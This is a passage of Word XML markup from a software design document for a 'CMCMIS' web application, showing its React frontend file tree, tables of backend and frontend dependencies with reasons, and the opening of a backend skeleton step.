              <w:t xml:space="preserve">        └── cookies.js            REFRESH_COOKIE_NAME · CSRF_COOKIE_NAME · option presets</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>Frontend  ·  SOFTWARE CODE/FE/</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tree</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>FE/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>├── .env.example                  VITE_API_BASE_URL placeholder</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>├── .gitignore</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>├── index.html                    title "CMCMIS · Sign In" + Inter from Google Fonts</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>├── package.json                  React 18, Vite 5, Tailwind 3, axios, zod, RHF, lucide (no TS deps)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>├── postcss.config.js             Tailwind + Autoprefixer</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>├── tailwind.config.js            11 color tokens · Inter stack · soft card shadow</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>├── vite.config.js                /api proxy → :3000 · @/ alias → src/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>└── src/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    ├── main.jsx                  React 18 createRoot + StrictMode + globals.css</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    ├── App.jsx                   AuthProvider → BrowserRouter → Routes</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    ├── styles/globals.css        @tailwind directives + body base + focus ring</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    ├── components/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   ├── Brand.jsx             "CMCMIS·" wordmark, sm/md/lg sizes</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   ├── Layout.jsx            Sidebar + TopBar + scrollable main</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   ├── ProtectedRoute.jsx    Loading / anonymous / forbidden / render</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   ├── Sidebar.jsx           Brand + identity + permission-filtered nav + sign out</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   ├── TopBar.jsx            Auto-derived title + role badge + initials disc</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   └── ui/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │       ├── Badge.jsx         Colored pills (badge/success/warning/danger/accent/ink)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │       ├── Button.jsx        Variants: primary/secondary/ghost × sm/md</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │       ├── FormField.jsx     Label + control + helper/error wrapper</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │       ├── Input.jsx         forwardRef-wrapped input (works with RHF)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │       └── Spinner.jsx       lucide Loader2 + animate-spin</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    ├── lib/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   ├── api-client.js         axios instance + Bearer/CSRF interceptors + refresh coalescing</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   ├── auth-context.jsx      &lt;AuthProvider/&gt; + useAuth() hook</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   ├── permissions.js        ALL_NAV_ITEMS + visibleNavItems(perms)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   └── schemas/loginSchema.js  Zod schema mirroring backend regex</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    └── pages/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        ├── Dashboard.jsx         Greeting + stat cards + permission inspector</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        ├── Forbidden.jsx         ShieldOff + missing permission code + back-to-dashboard CTA</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        └── Login.jsx             Hero + form + disabled SSO + compliance footer</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>1.4  Actual Tech Stack — Versions + Why</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Every dependency picked is in service of one of the locked decisions (D1–D11). The two tables below are the audit trail of WHY each library is on disk.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>Backend dependencies</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>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Library</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>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Version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>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Why it's here</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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express</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^4.19.2</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Web framework — D7</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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mysql2</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^3.11.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="56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MySQL driver with promise API — D2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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bcryptjs</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^2.4.3</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Verifies bcrypt hashes seeded in Phase 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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jsonwebtoken</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^9.0.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="56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Sign + verify access and refresh JWTs — D17</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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zod</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^3.23.0</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Input validation contract shared with FE — D1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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dotenv</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^16.4.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="56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Loads .env into process.env at boot</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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envalid</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^8.0.0</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Validates env; aborts process on missing/invalid vars</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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helmet</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^7.1.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="56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Sets ~15 OWASP-recommended security headers</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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cors</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^2.8.5</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Restricts allowed origins; credentials:true for refresh cookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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cookie-parser</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^1.4.7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="56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Parses Cookie: header into req.cookies</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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compression</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^1.7.4</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gzip JSON responses (~70% reduction)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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express-rate-limit</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^7.4.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="56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Brute-force throttle on /login + /refresh</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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pino</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^9.4.0</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Fast structured JSON logger — D6</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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pino-http</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^10.3.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="56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Per-request log line + req.log</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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pino-pretty</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^11.2.0</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Dev-only readable log transport</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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dayjs</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^1.11.13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="56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Symmetric date math between BE and FE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>Frontend dependencies</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>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Library</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>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Version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>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Why it's here</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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react / react-dom</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^18.3.1</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UI framework — D7 (FE half)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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react-router-dom</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^6.27.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="56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Client-side routing + NavLink active state</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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axios</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^1.7.7</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HTTP client + request/response interceptors</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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zod</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^3.23.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="56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Same schema lib as BE — runtime validation</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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react-hook-form</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^7.53.0</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Form state without re-render storms</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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@hookform/resolvers</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^3.9.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="56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Glue between RHF and Zod</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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lucide-react</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^0.454.0</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Icon set used in nav + UI primitives</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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clsx</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^2.1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="56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Conditional className merger</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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tailwindcss</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^3.4.13</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Utility CSS — D8</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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@tailwindcss/forms</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^0.5.9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="56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Normalises form element defaults across browsers</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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vite</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^5.4.8</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Dev server + bundler — D8</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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@vitejs/plugin-react</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^4.3.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="56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JSX support inside Vite</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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postcss + autoprefixer</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8.x / 10.x</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Required by Tailwind to emit final CSS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F3F4F6"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="4B5563"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="4B5563"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">NOTE  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>What you will NOT find in package.json</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>typescript — banned per Hard Rule (Part I.2).</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>@types/* — only TypeScript projects need ambient type definitions.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>any state-management lib (Redux, Zustand) — auth state lives in React context; routes have their own params; nothing else needs global state in Phase 4.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="480" w:after="200"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="4" w:color="4F5DFF"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="4F5DFF"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>Part II  ·  STEP 1  ·  Backend Skeleton</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Goal: a Node.js process that boots cleanly, validates its environment, opens a MySQL pool, exposes /healthz, and exits gracefully on SIGTERM. No routes, no auth, no controllers yet — just a process you can curl and reason about.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEF2FF"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="4F5DFF"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="4F5DFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">INFO  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
